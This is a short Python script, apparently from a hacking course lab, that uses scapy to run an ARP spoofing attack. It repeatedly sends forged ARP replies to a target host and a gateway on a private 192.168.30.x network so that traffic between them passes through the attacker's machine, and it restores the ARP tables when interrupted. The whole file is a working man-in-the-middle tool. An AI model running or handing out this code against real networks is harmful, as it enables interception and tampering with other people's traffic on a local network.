#!/usr/bin/env python

import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None



def spoof(target_ip, spoof_ip): 
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print(f"[!] Could not find MAC for {target_ip}")
        return 
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    ethernet_frame = scapy.Ether(dst=target_mac) / packet
    scapy.sendp(ethernet_frame, verbose=False)

sent_packets_counts = 0

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if destination_mac is None or source_mac is None: 
        print("[!] Could not find MAC Addresses for restoration.")
        return

    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    ethernet_frame = scapy.Ether(dst=destination_mac) / packet
    scapy.sendp(ethernet_frame, count=4, verbose=False)

target_ip = "192.168.30.129"
gateway_ip = "192.168.30.2"

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_counts = sent_packets_counts + 2
        print("\r[+] Packets sent: " + str(sent_packets_counts), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ...... Resetting the ARP tables........Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] ARP tables restored successfully.")


